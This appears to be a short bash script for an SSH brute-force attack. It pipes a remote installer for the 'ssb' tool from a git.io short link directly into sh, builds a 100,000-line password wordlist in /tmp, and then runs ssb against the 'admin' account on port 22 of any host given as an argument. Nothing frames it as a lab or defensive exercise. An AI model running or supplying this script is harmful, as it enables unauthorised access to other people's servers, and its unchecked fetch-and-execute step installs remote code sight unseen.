#!/bin/bash

# Download software from https://github.com/kitabisa/ssb
curl -sSfL 'https://git.io/kitabisa-ssb' | sh -s -- -b /usr/local/bin

# Create wordlist
for((i=0;i<100000;i++)); do echo "password$i" >> /tmp/dictionary.txt; done

# Attempt SSH brute force
/usr/local/bin/ssb -p 22 -w /tmp/dictionary.txt -v admin@"$1"
